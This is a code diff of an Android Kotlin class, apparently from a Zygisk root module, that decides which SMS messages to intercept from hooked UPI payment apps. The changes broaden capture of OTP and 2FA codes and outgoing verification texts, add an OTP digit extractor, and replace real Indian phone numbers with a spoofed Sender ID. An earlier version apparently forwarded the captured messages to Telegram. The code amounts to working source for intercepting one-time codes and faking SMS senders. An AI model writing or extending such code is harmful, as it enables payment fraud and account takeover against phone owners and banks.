@@ -1,5 +1,7 @@
 package com.hivirtus.zygiskmode
 
+import android.content.ClipData
+import android.content.ClipboardManager
 import android.content.Context
 import org.json.JSONObject
 import java.util.regex.Pattern
@@ -43,26 +45,27 @@ object SmsMatcher {
         }
     }
 
-    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String): Boolean =
-        shouldForwardToTelegram(config, peer, body, "incoming")
-
-    /** Incoming: verify token, 2FA OTP, hooked UPI app SMS */
     fun shouldInterceptIncoming(config: ModuleConfig, peer: String, body: String): Boolean {
         if (body.isBlank() || peer.isBlank()) return false
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
-        if (!isUpiVerificationContent(body)) return false
+
+        // Dusre phone (+91) se OTP — Sender ID saved + hooked apps
+        if (userSenderId(config) != null && (extractOtpDigits(body) != null || isUpiVerificationContent(body))) {
+            return true
+        }
+
+        if (!isUpiVerificationContent(body) && extractOtpDigits(body) == null) return false
 
         if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
         if (UpiAppRegistry.matchAmongBySender(hooked, peer) != null) return true
         if (UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
-        if (isEncryptedToken(body) && hooked.size == 1) return true
-        if (is2faContent(body) && hooked.isNotEmpty()) return true
+        if (isEncryptedToken(body) && hooked.isNotEmpty()) return true
+        if (is2faContent(body)) return true
 
         return false
     }
 
-    /** Outgoing: jo SMS bhejo verify ke liye — Telegram pe spoof Sender ID ke saath */
     fun shouldInterceptOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
         if (!config.hookOutgoingSms) return false
         if (body.isBlank() || recipient.isBlank()) return false
@@ -73,21 +76,35 @@ object SmsMatcher {
         if (is2faContent(body)) return true
         if (isShortCodeRecipient(recipient)) return true
         if (UpiAppRegistry.matchAmong(hooked, recipient, body) != null) return true
+        if (extractOtpDigits(body) != null && userSenderId(config) != null) return true
 
-        return body.length >= 4 && hooked.isNotEmpty()
+        return body.length >= 4
     }
 
+    /**
+     * +91 / phone number kabhi mat dikhao — hamesha saved Sender ID.
+     * Dusre phone se aaya ho to bhi Sender ID dikhega.
+     */
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
         userSenderId(config)?.let { return it }
+        if (isIndianMobileNumber(actualPeer) || isNumericSender(actualPeer)) {
+            return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
+        }
         if (isCarrierSenderId(actualPeer)) return actualPeer.trim()
-        val spoof = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
-        return spoof.ifBlank { "INTERCEPT" }
+        return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
+    }
+
+    fun isIndianMobileNumber(sender: String): Boolean {
+        val digits = sender.replace("\\D".toRegex(), "")
+        if (digits.length == 10) return true
+        if (digits.length == 12 && digits.startsWith("91")) return true
+        if (digits.length == 11 && digits.startsWith("0")) return true
+        return false
     }
 
     fun isCarrierSenderId(sender: String): Boolean {
         val s = sender.trim()
-        if (s.isBlank()) return false
-        if (isNumericSender(s)) return false
+        if (s.isBlank() || isIndianMobileNumber(s) || isNumericSender(s)) return false
         return s.any { it.isLetter() }
     }
 
@@ -101,20 +118,24 @@ object SmsMatcher {
         return digits.length in 4..10
     }
 
+    fun extractOtpDigits(body: String): String? {
+        val matcher = OTP_PATTERN.matcher(body)
+        if (matcher.find()) {
+            val digits = matcher.group(1) ?: return null
+            if (digits.length in 4..8) return digits
+        }
+        val trimmed = body.trim()
+        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return trimmed
+        return null
+    }
+
     fun extractToken(body: String, autoExtract: Boolean): String {
         val trimmed = body.trim()
         if (trimmed.isEmpty()) return ""
         if (isEncryptedToken(trimmed)) return trimmed
         if (isUpiVerificationContent(trimmed)) return trimmed
         if (!autoExtract) return trimmed
-
-        val matcher = OTP_PATTERN.matcher(trimmed)
-        if (matcher.find()) {
-            val digits = matcher.group(1) ?: trimmed
-            if (digits.length < 6 && trimmed.length > 20) return trimmed
-            return digits
-        }
-        return trimmed
+        return extractOtpDigits(trimmed) ?: trimmed
     }
 
     fun isEncryptedToken(text: String): Boolean {
@@ -137,6 +158,7 @@ object SmsMatcher {
     private fun isUpiVerificationContent(body: String): Boolean {
         if (isEncryptedToken(body)) return true
         if (is2faContent(body)) return true
+        if (extractOtpDigits(body) != null) return true
         val trimmed = body.trim()
         if (trimmed.length <= 3) return false
         val upper = trimmed.uppercase()
